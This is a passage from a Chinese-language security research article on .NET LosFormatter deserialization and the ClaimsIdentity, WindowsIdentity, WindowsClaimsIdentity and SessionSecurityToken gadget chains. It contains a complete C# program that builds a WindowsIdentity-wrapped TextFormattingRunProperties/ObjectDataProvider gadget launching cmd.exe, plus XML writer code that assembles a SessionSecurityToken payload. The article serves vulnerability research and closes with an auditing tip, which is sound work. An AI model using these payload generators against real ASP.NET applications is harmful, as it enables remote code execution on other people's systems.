        System.Web.dll!System.Web.UI.ObjectStateFormatter.Deserialize(string inputString, System.Web.Security.Cryptography.Purpose purpose) (IL≈0x0110, Native=0x00007FFC8C2B5630+0x36B)
        System.Web.dll!System.Web.UI.ObjectStateFormatter.Deserialize(string inputString) (IL≈0x0000, Native=0x00007FFC8C2B55C0+0x40)
        System.Web.dll!System.Web.UI.LosFormatter.Deserialize(string input) (IL≈0x0000, Native=0x00007FFC8C2B5560+0x39)
        System.Web.dll!System.Web.UI.LosFormatter.Deserialize(System.IO.TextReader input) (IL≈0x004F, Native=0x00007FFC8C2B3DD0+0x120)
        System.Web.dll!System.Web.UI.LosFormatter.Deserialize(System.IO.Stream stream) (IL≈0x0009, Native=0x00007FFC8C2B37B0+0x70)
        LosFormatterDeserialize.exe!LosFormatterDeserialize.Program.Main(string[] args) (IL≈0x0033, Native=0x00007FFC8B9C6F70+0x119)
可见ObjectStateFormatter.DeserializeValue()在反序列化还原字段时又进入了binaryformatter的反序列化。看一下ObjectStateFormatter.SerializeValue序列化时的实现
分别判断字段类型，然后分别写入一个类型对应的Token_xxx值和字段的值。在
中判断完所有的基本类型之后尝试获取类型转换器，如果没有类型转换器就直接用二进制formatter序列化存储。注意先写入了一个Token_BinarySeriaized。
那么在反序列化的时候看下ObjectStateFormatter.DeserializeValue()的实现，先读出一个字节，字节中存储着类型，然后开始case
当case到Token_BinarySerialized时
直接binary反序列化。
那么至此可知，LosFormatter底层ObjectStatesFormatter会调用binaryformatter序列化和反序列化自身object字段。这也是ClaimsIdentity链的原理，套娃二次反序列化。
## WindowsIdentity
WindowsIdentity继承自ClaimsIdentity，其反序列化构造函数也调用了父类的反序列化构造函数
在父类反序列化构造函数中
跟进Deserialize()
三个case中ActorKey和BootstrapContextKey均可以进行binaryformatter反序列化。ClaimsKey进入DeserializeClaims
可见三个case均通过binaryformatter进行反序列化，看下几个case对应的值
那么在info中设置key为System.Security.ClaimsIdentity.actor或bootstrapContext或claims，值为base64之后的TextFormattingRunPropertiesMarshal对象即可触发RCE。
整合payload如下：
    using Microsoft.VisualStudio.Text.Formatting;
    using System;
    using System.Collections.Specialized;
    using System.Diagnostics;
    using System.IO;
    using System.Reflection;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Security.Principal;
    using System.Web.UI;
    using System.Windows.Data;
    using System.Windows.Markup;
    namespace LosFormatterDeserialize
    {
        class Program
        {
            static void Main(string[] args)
            {
                LosFormatter losFormatter = new LosFormatter();
                BinaryFormatter bf = new BinaryFormatter();
                using (MemoryStream memory = new MemoryStream())
                {
                    TextFormattingRunPropertiesMarshal textFormattingRunPropertiesMarshal = new TextFormattingRunPropertiesMarshal();
                    bf.Serialize(memory, textFormattingRunPropertiesMarshal);
                    string b64payload = Convert.ToBase64String(memory.ToArray());
                    WindowsIdentityIdentityMarshal windowsIdentityIdentityMarshal = new WindowsIdentityIdentityMarshal(b64payload);
                    memory.Position = 0;
                    losFormatter.Serialize(memory, windowsIdentityIdentityMarshal);
                    memory.Position = 0;
                    losFormatter.Deserialize(memory);
                }
                Console.ReadKey();
            }
        }
        [Serializable]
        public class WindowsIdentityIdentityMarshal : ISerializable
        {
            public WindowsIdentityIdentityMarshal(string b64payload)
            {
                B64Payload = b64payload;
            }
            private string B64Payload { get; }
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(WindowsIdentity));
                info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
                info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
                info.AddValue("System.Security.ClaimsIdentity.claims", B64Payload);
            }
        }
        [Serializable]
        public class TextFormattingRunPropertiesMarshal : ISerializable
        {
            public static string gadget(string cmd)
            {
                // ObjectDataProvider
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = $"/c {cmd}";
                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;
                return XamlWriter.Save(odp);
            }
            protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
            {
            }
            string _xaml;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                Type typeTFRP = typeof(TextFormattingRunProperties);
                info.SetType(typeTFRP);
                info.AddValue("ForegroundBrush", _xaml);
            }
            public TextFormattingRunPropertiesMarshal(string cmd)
            {
                _xaml = gadget(cmd);
            }
            public TextFormattingRunPropertiesMarshal()
            {
                _xaml = gadget("calc");
            }
        }
    }
## WindowsClaimsIdentity
查看ysoserial.net中的payload构造，发现和上文原理一样，也是通过actor字段。
不再赘述。需要注意的是：
> Requires Microsoft.IdentityModel.Claims namespace (not default GAC)
该类所在的命名空间不在GAC([Global Assembly Cache](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/gac))中，限制较大。
## SessionSecurityToken
在yso中
关键点在于BootStrapToken，在SessionSecurityToken类中搜索关键字找到ReadIdentity方法。
该方法中将BootstrapToken标签中的内容base64解码通过binaryformatter反序列化。查看ReadIdentity这个方法被使用在哪些地方：
发现在该类反序列化构造函数中可以多次调用抵达ReadIdentity()。查看该类方法定义，发现多个read对应多个write
那么ReadIdentity对应的就是WriteIdentity，ReadIdentities对应WriteIdentities，ReadPrincipal对应WritePrincipal。而反序列化构造函数对应的就是GetObjectData()。那么针对GetObjectData的序列化过程就可以写出payload。
第一步反序列化构造函数中要绕过一个异常
在序列化的时候有一种最简单的方式绕过异常
所以构造代码`xmlDictionaryWriter.WriteStartElement("SecurityContextToken",
"")`继续根据序列化的代码写payload
    // Serialization Format Version
    // 1
    dicWriter.WriteStartElement(dictionary.Version, dictionary.EmptyString);
    dicWriter.WriteValue(SupportedVersion);
    dicWriter.WriteEndElement();
    //
    // SecureConversation Version
    //
    dicWriter.WriteElementString(dictionary.SecureConversationVersion, dictionary.EmptyString, this.SecureConversationVersion.AbsoluteUri);
    //
    // ID and ContextId
    //
    dicWriter.WriteElementString(dictionary.Id, dictionary.EmptyString, this.Id);
    XmlUtil.WriteElementStringAsUniqueId(dicWriter, dictionary.ContextId, dictionary.EmptyString, this.ContextId.ToString());
    //
    // Key material
    //
    byte[] key = ((SymmetricSecurityKey)this.SecurityKeys[0]).GetSymmetricKey();
    dicWriter.WriteStartElement(dictionary.Key, dictionary.EmptyString);
    dicWriter.WriteBase64(key, 0, key.Length);
    dicWriter.WriteEndElement();
    //
    // Key Generation
    //
    if (this.KeyGeneration != null)
    {
    XmlUtil.WriteElementStringAsUniqueId(dicWriter, dictionary.KeyGeneration, dictionary.EmptyString, this.KeyGeneration.ToString());
    }
    //
    // Effective and Expiry dates
    //
    XmlUtil.WriteElementContentAsInt64(dicWriter, dictionary.EffectiveTime, dictionary.EmptyString, this.ValidFrom.ToUniversalTime().Ticks);
    XmlUtil.WriteElementContentAsInt64(dicWriter, dictionary.ExpiryTime, dictionary.EmptyString, this.ValidTo.ToUniversalTime().Ticks);
    XmlUtil.WriteElementContentAsInt64(dicWriter, dictionary.KeyEffectiveTime, dictionary.EmptyString, this.KeyEffectiveTime.ToUniversalTime().Ticks);
    XmlUtil.WriteElementContentAsInt64(dicWriter, dictionary.KeyExpiryTime, dictionary.EmptyString, this.KeyExpirationTime.ToUniversalTime().Ticks);
    //
    // Claims Principal
    //
    WritePrincipal(dicWriter, dictionary, this.ClaimsPrincipal);
对应的就是
    xmlDictionaryWriter.WriteStartElement("Version", "");
    xmlDictionaryWriter.WriteValue("1");
    xmlDictionaryWriter.WriteEndElement();
    xmlDictionaryWriter.WriteElementString("SecureConversationVersion", "", (new Uri("http://schemas.xmlsoap.org/ws/2005/02/sc")).AbsoluteUri);
    xmlDictionaryWriter.WriteElementString("Id", "", "1");
    WriteElementStringAsUniqueId(xmlDictionaryWriter, "ContextId", "", "1");
    xmlDictionaryWriter.WriteStartElement("Key", "");
    xmlDictionaryWriter.WriteBase64(new byte[] { 0x01 }, 0, 1);
    xmlDictionaryWriter.WriteEndElement();
    WriteElementContentAsInt64(xmlDictionaryWriter, "EffectiveTime", "", 1);
    WriteElementContentAsInt64(xmlDictionaryWriter, "ExpiryTime", "", 1);
    WriteElementContentAsInt64(xmlDictionaryWriter, "KeyEffectiveTime", "", 1);
    WriteElementContentAsInt64(xmlDictionaryWriter, "KeyExpiryTime", "", 1);
接着就是ReadPrincipal的构造
写一个ClaimsPrincipal标签进去
然后在写Identities标签和Identity标签，最后在
这个地方需要写一个base64之后的payload，填充为BootstrapToken就行了。
代码如下：
    xmlDictionaryWriter.WriteStartElement("ClaimsPrincipal", "");
    xmlDictionaryWriter.WriteStartElement("Identities", "");
    xmlDictionaryWriter.WriteStartElement("Identity", "");
    xmlDictionaryWriter.WriteStartElement("BootStrapToken", "");
    xmlDictionaryWriter.WriteValue(B64Payload); // This is where the payload is
    xmlDictionaryWriter.WriteEndElement();
    xmlDictionaryWriter.WriteEndElement();
    xmlDictionaryWriter.WriteEndElement();
    xmlDictionaryWriter.WriteEndElement();
至此就结束了。
# 审计
除了关注反序列化方法传入的参数值，还需要注意使用LosFormatter和ObjectStatesFormatter可能会造成二次反序列化，要关注object类型的字段。
# 后文
本文讲解了LosFormatter序列化及反序列化，并分析了ClaimsIdentity、WindowsIdentity、WindowsClaimsIdentity、SessionSecurityToken四条利用链。